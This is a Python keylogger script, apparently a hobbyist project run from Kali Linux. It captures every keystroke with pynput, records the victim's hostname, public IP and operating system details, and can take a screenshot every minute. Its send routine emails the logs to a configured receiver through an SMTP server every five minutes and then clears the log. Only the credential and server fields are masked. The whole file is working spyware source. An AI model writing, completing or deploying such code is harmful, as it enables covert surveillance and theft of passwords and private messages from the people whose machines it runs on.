from multiprocessing import context
from pynput.keyboard import Key, Listener # 
import logging
import smtplib
import ssl 
from email.message import EmailMessage
import time
import platform
import socket
import requests
from threading import Thread
import pyautogui
import os


sys_info = []
fucking_keys = []


keyloger_files_location = "/home/kali/Desktop/keylooger"  #------> Change here
EMAIL_SENDER = '###########'  #------> Change here
EMAIL_PASSWORD = '#########*'  #------> Change here
EMAIL_RECEIVER = '#########'  #------> Change here
log_file = "{}/logs.txt".format(keyloger_files_location)




def get_info():
    hostname = socket.gethostname()
    ip = requests.get('https://checkip.amazonaws.com').text.strip()
    system = platform.system()
    machine = platform.machine()
    version = platform.version()
    sys_info.append(hostname)
    sys_info.append(ip)
    sys_info.append(system)
    sys_info.append(machine)
    sys_info.append(version)



logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=" %(message)s" )

def on_press(key): # --------> WILL BE UPDATE
    if str(key) != 'Key.enter' and str(key)!= 'Key.backspace':
        fucking_keys.append(str(key).strip("'"))

    elif str(key) == 'Key.backspace':
        pass
        """
        current_key_number == len(fucking_keys)
        current_key = fucking_keys[:-1]
        fucking_keys.remove(current_key)
        """

    else:
        fucking_keys.append(str(key).strip("'"))
        logging.info(str(fucking_keys))
        fucking_keys.clear()




def screenshot():
    ss = 0 
    while True: 
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('{}/{}.png'.format(keyloger_files_location,str(ss))) 
        time.sleep(60) # --------------> SCREENSHOT TIME
        ss+=1

def send():
    while True:
        time.sleep(300) # ----------------> EMAIL SEND TIME 
        SUBJECT = 'Just Mail'
        with open(log_file , 'r') as f:
            readed_content = f.read()
        body = "{}{}".format(sys_info,readed_content)    


        em = EmailMessage()
        em['From'] = EMAIL_SENDER
        em['To'] = EMAIL_RECEIVER
        em['Subject'] = SUBJECT
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('##########', 465,context=context) as smtp: #------> Change here
            smtp.login(EMAIL_SENDER ,EMAIL_PASSWORD)
            smtp.sendmail(EMAIL_SENDER ,EMAIL_RECEIVER ,em.as_string())
        f = open(log_file, 'r+')
        f.truncate(0)

def fucking_listener():        
    while True:
        with Listener(on_press=on_press) as listener :
            listener.join()

if __name__ == '__main__':
    Thread(target=fucking_listener).start()     
    #Thread(target = send).start()
    Thread(target=get_info).start()
#    Thread(target=screenshot).start()
